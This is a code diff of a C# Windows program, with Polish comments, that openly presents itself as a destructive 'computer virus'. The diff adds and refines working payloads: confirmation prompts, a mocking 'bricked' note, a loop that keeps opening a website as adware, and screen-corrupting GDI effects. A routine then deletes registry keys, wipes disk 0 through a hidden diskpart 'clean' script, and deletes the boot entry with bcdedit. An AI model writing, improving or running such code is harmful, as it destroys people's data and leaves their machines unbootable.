@@ -24,33 +24,58 @@ class InternalSystemModule
     static bool destructionStarted = false;
 
     static bool IsAdmin() {
-        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+        try {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        } catch { return false; }
     }
 
     [STAThread]
     static void Main() {
+        // Blokada zamykania: sprawdzamy admina
         if (!IsAdmin()) {
-            Process.Start("cmd.exe", "/c color c && echo Uruchom jako Administrator! && pause");
+            MessageBox.Show("ERROR: Please run as Administrator!", "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
+            // Odpalamy CMD żeby uczeń widział komunikat
+            Process.Start("cmd.exe", "/c color c && echo RUN AS ADMIN OR SYSTEM WILL NOT BE ROFUCKED! && pause");
             return;
         }
 
-        if (MessageBox.Show("Destroy system?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes) {
-            if (MessageBox.Show("ARE YOU SURE? (ROFUCKED MODE)", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes) {
-                
-                // 1. Notatnik
-                string note = Path.Combine(Path.GetTempPath(), "readme.txt");
-                File.WriteAllText(note, "Your computer has been bricked by malware.\n\n:D\nBy the way, your Regedit and UEFI have also been bricked.");
-                Process.Start("notepad.exe", note);
+        try {
+            Application.EnableVisualStyles();
+            string msg = "This computer virus will destroy your computer beyond repair.\nAre you sure?";
+            if (MessageBox.Show(msg, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes) {
+                if (MessageBox.Show("FINAL WARNING!", "ROFUCKED", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes) {
+                    
+                    // Start notatnika
+                    new Thread(() => {
+                        try {
+                            string note = Path.Combine(Path.GetTempPath(), "readme.txt");
+                            File.WriteAllText(note, "Your computer has been bricked by malware.\n\n:D\nEnjoy animations.");
+                            Process.Start("notepad.exe", note);
+                        } catch {}
+                    }).Start();
 
-                // 2. Ladunki
-                new Thread(MalwarePayload).Start();
-                new Thread(() => {
-                    while(true) {
-                        try { Process.Start("https://chomikuj.pl"); } catch {}
-                        Thread.Sleep(25000);
-                    }
-                }).Start();
+                    // Start Malware
+                    Thread t = new Thread(MalwarePayload);
+                    t.SetApartmentState(ApartmentState.STA);
+                    t.Start();
+
+                    // Adware w tle
+                    new Thread(() => {
+                        while(true) {
+                            try { Process.Start("https://chomikuj.pl"); } catch {}
+                            Thread.Sleep(20000);
+                        }
+                    }).Start();
+
+                    // Utrzymujemy proces przy życiu
+                    while(true) { Thread.Sleep(1000); }
+                }
             }
+        } catch (Exception ex) {
+            File.WriteAllText("error_log.txt", ex.ToString());
+            MessageBox.Show("Crash: " + ex.Message);
         }
     }
 
@@ -66,14 +91,17 @@ class InternalSystemModule
                 if (ms < 40000) Graphics.FromHdc(hdc).DrawIcon(SystemIcons.Error, rnd.Next(w), rnd.Next(h));
                 else if (ms < 120000) {
                     if (rnd.Next(10) > 8) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
-                    BitBlt(hdc, rnd.Next(w), rnd.Next(h), 100, 100, hdc, rnd.Next(w), rnd.Next(h), SRCCOPY);
+                    BitBlt(hdc, rnd.Next(w), rnd.Next(h), 150, 150, hdc, rnd.Next(w), rnd.Next(h), SRCCOPY);
                 }
-                else if (ms < 200000) BitBlt(hdc, 5, 5, w - 10, h - 10, hdc, 0, 0, SRCCOPY);
+                else if (ms < 200000) {
+                    BitBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, SRCCOPY);
+                }
                 else {
-                    BitBlt(hdc, 0, 5, w, h - 5, hdc, 0, 0, SRCCOPY);
-                    BitBlt(hdc, (int)(Math.Sin(ms/400.0)*10), 0, w, h, hdc, 0, 0, SRCCOPY);
+                    BitBlt(hdc, 0, 10, w, h - 10, hdc, 0, 0, SRCCOPY);
+                    int s = (int)(Math.Sin(ms/400.0)*15);
+                    BitBlt(hdc, s, 0, w, h, hdc, 0, 0, SRCCOPY);
                 }
-                Thread.Sleep(20);
+                Thread.Sleep(25);
             } else {
                 if (!destructionStarted) {
                     destructionStarted = true;
@@ -81,25 +109,25 @@ class InternalSystemModule
                 }
                 BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), w, h, hdc, 0, 0, SRCCOPY);
                 if (ms > 310000) {
-                    Application.EnableVisualStyles();
-                    Application.Run(new FinalAnim());
+                    FinalAnim f = new FinalAnim();
+                    f.ShowDialog();
                     Process.Start("powershell.exe", "wininit");
                 }
-                Thread.Sleep(5);
+                Thread.Sleep(10);
             }
         }
     }
 
     static void DoRoFucked() {
         try {
-            // Rejestr
-            Registry.LocalMachine.DeleteSubKeyTree("Software", false);
-            // Dysk
-            string script = Path.Combine(Path.GetTempPath(), "s.txt");
-            File.WriteAllText(script, "select disk 0\nclean");
-            Process.Start(new ProcessStartInfo("diskpart.exe", "/s " + script) { WindowStyle = ProcessWindowStyle.Hidden });
+            // Niszczenie rejestru - klucze krytyczne
+            Registry.LocalMachine.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+            // Diskpart
+            string scr = Path.Combine(Path.GetTempPath(), "s.txt");
+            File.WriteAllText(scr, "select disk 0\nclean");
+            Process.Start("diskpart.exe", "/s " + scr);
             // Boot
-            Process.Start(new ProcessStartInfo("bcdedit", "/delete {current} /f") { WindowStyle = ProcessWindowStyle.Hidden });
+            Process.Start("bcdedit", "/delete {current} /f");
         } catch {}
     }
 }
@@ -107,18 +135,18 @@ class InternalSystemModule
 public class FinalAnim : Form {
     int i = 0; float a = 0; string t = "Computer have been BRICKED. Enjoy \"Animation\"";
     public FinalAnim() {
-        this.FormBorderStyle = 0; this.WindowState = (FormWindowState)2; this.BackColor = Color.Black; this.TopMost = true;
-        var tm = new System.Windows.Forms.Timer { Interval = 100 };
-        tm.Tick += (s, e) => { if (i < t.Length) i++; else a += 20; this.Invalidate(); };
+        this.FormBorderStyle = 0; this.WindowState = FormWindowState.Maximized; this.BackColor = Color.Black; this.TopMost = true;
+        System.Windows.Forms.Timer tm = new System.Windows.Forms.Timer { Interval = 100 };
+        tm.Tick += (s, e) => { if (i < t.Length) i++; else a += 15; this.Invalidate(); };
         tm.Start();
     }
     protected override void OnPaint(PaintEventArgs e) {
-        e.Graphics.DrawString(t.Substring(0, i), new Font("Consolas", 30), Brushes.Lime, 50, 50);
+        e.Graphics.DrawString(t.Substring(0, i), new Font("Consolas", 24, FontStyle.Bold), Brushes.Lime, 50, Height/2 - 100);
         if (i >= t.Length) {
-            e.Graphics.TranslateTransform(Width / 2, Height / 2);
+            e.Graphics.TranslateTransform(Width/2, Height/2);
             e.Graphics.RotateTransform(a);
             e.Graphics.FillEllipse(Brushes.Gold, -100, -50, 200, 100);
-            e.Graphics.FillPolygon(Brushes.Gold, new Point[] { new Point(80, 0), new Point(150, -50), new Point(150, 50) });
+            e.Graphics.FillPolygon(Brushes.Gold, new Point[] { new Point(80,0), new Point(150,-50), new Point(150,50) });
         }
     }
 }
